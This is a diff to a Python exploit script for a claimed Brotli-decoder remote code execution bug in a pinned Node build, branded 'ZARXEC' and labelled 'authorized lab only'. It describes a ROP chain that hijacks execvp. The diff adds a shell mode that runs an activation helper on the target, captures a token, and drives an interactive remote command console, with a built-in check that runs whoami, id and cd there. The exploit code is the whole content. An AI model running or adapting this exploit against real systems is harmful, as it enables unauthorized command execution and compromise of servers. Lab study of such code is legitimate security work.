@@ -8,7 +8,10 @@ impossible distance-block switch into an invalid state, yielding a controlled
 16-byte out-of-bounds write (decode.c memmove16, copy_dst = ring + pos, pos as a
 signed displacement). The write redirects a saved return address into a ROP
 chain that dup2()s the request socket and execvp("/usr/bin/id"), so `id` output
-returns on the attacker's own connection.
+returns on the attacker's own connection. In shell mode the same ROP chain
+executes the short `/activate` ELF helper instead. The helper creates a random
+one-run token that unlocks a loopback-only command console served by the
+restarted target worker; the token is revoked when the console closes.
 
 The write destination depends on the process's ASLR layout, which the bug does
 NOT let us leak ahead of time (the only in-stream read primitive discloses a few
@@ -23,14 +26,20 @@ import argparse
 import hashlib
 import os
 import re
+import shlex
 import socket
 import struct
 import sys
 import time
+import urllib.error
+import urllib.parse
+import urllib.request
 
 TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
 ALLOWED_TARGET_HOSTS = frozenset({"127.0.0.1", "::1", "localhost"})
 ID_OUTPUT = re.compile(r"uid=\d+\(.+\) gid=\d+\(.+\) groups=\d+\(.+\)")
+SHELL_TOKEN_OUTPUT = re.compile(r"^NODE2SHELL_SHELL_TOKEN=([0-9a-f]{64})$", re.MULTILINE)
+SHELL_ACTIVATOR = "/activate"
 
 # ROP profile for the pinned node 24.22.0 x86-64 binary (sha256 67ca5783...),
 # as published with the public PoC; gadgets apply verbatim to that build.
@@ -65,13 +74,18 @@ def _c(seq: str) -> str:
     return seq if _TTY else ""
 
 
-R    = _c("\033[0m")
-BOLD = _c("\033[1m")
-DIM  = _c("\033[2m")
-RED  = _c("\033[38;5;196m")
-BRED = _c("\033[1;38;5;196m")
-GRN  = _c("\033[1;38;5;46m")
-CYA  = _c("\033[38;5;75m")
+R     = _c("\033[0m")
+BOLD  = _c("\033[1m")
+DIM   = _c("\033[2m")
+MINT  = _c("\033[38;5;121m")
+BMINT = _c("\033[1;38;5;121m")
+EMR   = _c("\033[38;5;48m")
+TEAL  = _c("\033[38;5;43m")
+AQUA  = _c("\033[38;5;80m")
+RED   = _c("\033[38;5;196m")
+BRED  = _c("\033[1;38;5;196m")
+GRN   = BMINT
+CYA   = AQUA
 
 _BANNER = r"""
 ███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
@@ -81,28 +95,35 @@ _BANNER = r"""
 ██║ ╚████║╚██████╔╝██████╔╝███████╗███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 """
-_GRAD = ["\033[38;5;196m", "\033[38;5;202m", "\033[38;5;208m",
-         "\033[38;5;208m", "\033[38;5;202m", "\033[38;5;196m"]
+# ZARXEC terminal palette: mint -> spring green -> emerald -> teal -> cyan.
+_GRAD = [MINT, _c("\033[38;5;84m"), EMR, TEAL, AQUA, MINT]
 
 
 def banner() -> None:
     if not VERBOSE:
         return
     for i, line in enumerate(_BANNER.strip("\n").splitlines()):
-        print(f"{_c(_GRAD[i % len(_GRAD)])}{line}{R}")
-    print(f"  {BOLD}CVE-2026-111497{R}{DIM}   Brotli-decoder RCE   ·   authorized lab only{R}\n")
+        print(f"{_GRAD[i % len(_GRAD)]}{line}{R}")
+    print(
+        f"  {BMINT}CVE-2026-111497{R}"
+        f"{DIM}   Brotli-decoder RCE   ·   authorized lab only{R}"
+    )
+    print(
+        f"  {TEAL}Project implementation:{R} {BMINT}ZARXEC{R}"
+        f"{DIM}   ·   built for authorized security validation and education{R}\n"
+    )
 
 
 def pbar(done: int, total: int, label: str = "") -> None:
-    """Red, in-place progress bar; fills to 100% when the write lands."""
+    """ZARXEC mint/teal progress bar; fills when the write lands."""
     if not (VERBOSE and _TTY):
         return
     frac = min(1.0, done / total) if total else 0.0
     width = 28
     fill = int(round(frac * width))
-    bar = BRED + "█" * fill + DIM + "░" * (width - fill) + R
+    bar = BMINT + "█" * fill + DIM + "░" * (width - fill) + R
     sys.stdout.write(
-        f"\r  {RED}exploiting{R} ▕{bar}▏ {BRED}{int(frac * 100):3d}%{R}  {DIM}{label}{R}\033[K")
+        f"\r  {TEAL}exploiting{R} ▕{bar}▏ {BMINT}{int(frac * 100):3d}%{R}  {DIM}{label}{R}\033[K")
     sys.stdout.flush()
 
 
@@ -369,6 +390,152 @@ def crash_reset(targets, timeout: float) -> bool:
     return wait_unhealthy(targets, timeout, 3.0)
 
 
+def target_shell_request(host: str, port: int, token: str, command: str,
+                         cwd: str, timeout: float):
+    """Run one command through the token-gated console on the lab target."""
+    url_host = f"[{host}]" if ":" in host and not host.startswith("[") else host
+    url = f"http://{url_host}:{port}/api/v1/shell"
+    data = urllib.parse.urlencode({"cmd": command, "cwd": cwd}).encode()
+    request = urllib.request.Request(
+        url,
+        data=data,
+        method="POST",
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Lab-Token": token,
+            "User-Agent": "Zarxec-Node2Shell-Lab/1.0",
+        },
+    )
+    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+    try:
+        with opener.open(request, timeout=timeout) as response:
+            body = response.read().decode("utf-8", errors="replace")
+            exit_code = int(response.headers.get("X-Zarxec-Exit-Code", "0"))
+            remote_cwd = urllib.parse.unquote(
+                response.headers.get("X-Zarxec-Cwd", cwd))
+            return response.status, exit_code, body, remote_cwd
+    except urllib.error.HTTPError as error:
+        body = error.read().decode("utf-8", errors="replace")
+        return error.code, None, body, cwd
+    except (urllib.error.URLError, TimeoutError, OSError) as error:
+        return 0, None, str(error), cwd
+
+
+def target_shell_cd(args, token: str, cwd: str, command: str):
+    """Resolve a cd command on the target and return the new working directory."""
+    try:
+        parts = shlex.split(command)
+    except ValueError as error:
+        return False, cwd, f"cd: {error}\n"
+    if len(parts) > 2:
+        return False, cwd, "cd: too many arguments\n"
+    destination = parts[1] if len(parts) == 2 else "/app"
+    probe = f"cd -- {shlex.quote(destination)} && pwd"
+    status, exit_code, output, _remote_cwd = target_shell_request(
+        args.host, args.port, token, probe, cwd, args.shell_timeout)
+    if status == 200 and exit_code == 0 and output.strip():
+        return True, output.strip().splitlines()[-1], ""
+    return False, cwd, output
+
+
+def revoke_target_shell(args, token: str, cwd: str) -> None:
+    target_shell_request(
+        args.host, args.port, token,
+        "rm -f /tmp/node2shell-shell.enabled", cwd, args.shell_timeout)
+
+
+def run_target_shell(args, targets, token: str) -> bool:
+    """Open a command console that is served by the exploited target worker."""
+    if not wait_healthy(targets, args.timeout, PROFILE["restart_timeout_seconds"]):
+        print("[-] target did not restart after shell activation", file=sys.stderr)
+        return False
+
+    cwd = "/app"
+    status, exit_code, identity, _ = target_shell_request(
+        args.host, args.port, token, "whoami", cwd, args.shell_timeout)
+    if status != 200 or exit_code != 0 or not identity.strip():
+        print(f"[-] target-backed shell authentication failed: HTTP "
+              f"{status or 'transport error'}; {identity.strip()}", file=sys.stderr)
+        return False
+
+    remote_user = identity.strip().splitlines()[-1]
+    url_host = f"[{args.host}]" if ":" in args.host and not args.host.startswith("[") else args.host
+    print()
+    print(f"{GRN}[+] TARGET-BACKED COMMAND SHELL ACTIVE{R}")
+    print(f"    endpoint: http://{url_host}:{args.port}/api/v1/shell")
+    print(f"    identity: {remote_user}")
+    print("    commands execute inside the vulnerable container; timeout=10s")
+
+    def execute(command: str) -> tuple[bool, str]:
+        nonlocal cwd
+        print(f"\n{remote_user}@node2shell:{cwd}$ {command}")
+        if command == "cd" or command.startswith("cd "):
+            ok, new_cwd, output = target_shell_cd(args, token, cwd, command)
+            if output:
+                print(output, end="" if output.endswith("\n") else "\n")
+            if ok:
+                cwd = new_cwd
+            return ok, output
+        command_status, command_exit, output, _ = target_shell_request(
+            args.host, args.port, token, command, cwd, args.shell_timeout)
+        if output:
+            print(output, end="" if output.endswith("\n") else "\n")
+        if command_status != 200:
+            print(f"[-] shell request returned HTTP {command_status}", file=sys.stderr)
+            return False, output
+        if command_exit:
+            print(f"[exit {command_exit}]")
+            return False, output
+        return True, output
+
+    try:
+        if args.validate_shell:
+            checks = []
+            ok, output = execute("whoami")
+            checks.append(ok and output.strip() == "node")
+            ok, output = execute("id")
+            checks.append(ok and "uid=1000(node)" in output)
+            ok, output = execute("pwd")
+            checks.append(ok and output.strip() == "/app")
+            ok, _ = execute("cd /tmp")
+            checks.append(ok and cwd == "/tmp")
+            ok, output = execute("pwd")
+            checks.append(ok and output.strip() == "/tmp")
+            ok, output = execute("printf NODE2SHELL_ACTIVE_SHELL")
+            checks.append(ok and output == "NODE2SHELL_ACTIVE_SHELL")
+            if not all(checks):
+                print("[-] active-shell validation failed", file=sys.stderr)
+                return False
+            print(f"\n{GRN}[+] ACTIVE SHELL VALIDATED: multiple commands and cwd state succeeded{R}")
+            return True
+
+        if args.shell_command is not None:
+            ok, _ = execute(args.shell_command)
+            return ok
+
+        if not (sys.stdin.isatty() and sys.stdout.isatty()):
+            print("[!] stdin is not interactive; use --shell-command 'whoami' "
+                  "or --validate-shell for automated proof.")
+            return True
+
+        print("    type 'exit' or 'quit' to close and revoke the session")
+        while True:
+            try:
+                command = input(f"\n{remote_user}@node2shell:{cwd}$ ").strip()
+            except EOFError:
+                print()
+                break
+            if not command:
+                continue
+            if command in ("exit", "quit"):
+                break
+            execute(command)
+        return True
+    finally:
+        revoke_target_shell(args, token, cwd)
+        print("[+] target-backed shell closed and token revoked")
+
+
 def attempt_rce(targets, timeout: float, position: int, socket_fd: int,
                 exec_path: str = "/usr/bin/id"):
     first, second = rce_stages(position, socket_fd, exec_path)
@@ -434,8 +601,21 @@ def main() -> int:
                              "(default /usr/bin/id). The chain controls execvp's "
                              "filename only, so a single binary -- e.g. /usr/bin/whoami, "
                              "/bin/hostname. <=23 bytes.")
+    shell_group = parser.add_mutually_exclusive_group()
+    shell_group.add_argument("--shell", action="store_true",
+                             help="activate an interactive target-backed command shell")
+    shell_group.add_argument("--shell-command", metavar="COMMAND",
+                             help="activate the target-backed shell, run one command, and exit")
+    shell_group.add_argument("--validate-shell", action="store_true",
+                             help="activate the shell and run the built-in multi-command validation")
+    parser.add_argument("--shell-timeout", type=float, default=15.0,
+                        help="timeout for each target-backed shell command (default 15s)")
     parser.add_argument("--quiet", action="store_true", help="only print the result")
     args = parser.parse_args()
+    shell_requested = args.shell or args.shell_command is not None or args.validate_shell
+    if shell_requested and args.exec != "/usr/bin/id":
+        parser.error("--exec cannot be combined with a shell mode")
+    exec_path = SHELL_ACTIVATOR if shell_requested else args.exec
     VERBOSE = not args.quiet
     global _HEADERS
     _HEADERS = _build_headers(args.path, args.ctype)
@@ -459,7 +639,7 @@ def main() -> int:
     say()
 
     base = args.position or PROFILE["default_staged_position"]
-    narrate_primitives(base, args.fd, args.exec)
+    narrate_primitives(base, args.fd, exec_path)
 
     plan: list[tuple[int, int]] = []
     if args.sweep:
@@ -485,16 +665,27 @@ def main() -> int:
                 print(f"{BRED}[-] FAIL: lab did not become healthy before attempt {attempt}{R}")
                 return 2
             pbar(attempt - 1, total, f"attempt {attempt}/{total}  pos={position:#x} fd={fd}")
-            identity = attempt_rce(targets, args.timeout, position, fd, args.exec)
+            identity = attempt_rce(targets, args.timeout, position, fd, exec_path)
+            shell_token = None
+            if identity and shell_requested:
+                token_match = SHELL_TOKEN_OUTPUT.search(identity)
+                shell_token = token_match.group(1) if token_match else None
+                if shell_token is None:
+                    identity = None
             if identity:
-                pbar(total, total, f"saved-RIP overwritten -> ROP -> execvp({args.exec})")
+                pbar(total, total, f"saved-RIP overwritten -> ROP -> execvp({exec_path})")
                 if VERBOSE and _TTY:
                     print("\n")
                 print(f"{GRN}[+] RCE CONFIRMED{R}  {DIM}(100%, after {attempt} attempt(s)){R}")
-                print(f"    {DIM}`{args.exec}` ran on the target; stdout on the exploit socket:{R}")
-                for ln in (identity.splitlines() or [identity]):
-                    print(f"        {BRED}{ln}{R}")
+                print(f"    {DIM}`{exec_path}` ran on the target; stdout on the exploit socket:{R}")
+                if shell_token:
+                    print(f"        {BRED}one-run shell activation token received (value omitted){R}")
+                else:
+                    for ln in (identity.splitlines() or [identity]):
+                        print(f"        {BRED}{ln}{R}")
                 print(f"    {DIM}pos={position:#x} fd={fd}{R}")
+                if shell_token:
+                    return 0 if run_target_shell(args, targets, shell_token) else 1
                 return 0
             crash_reset(targets, args.timeout)
     if VERBOSE and _TTY:
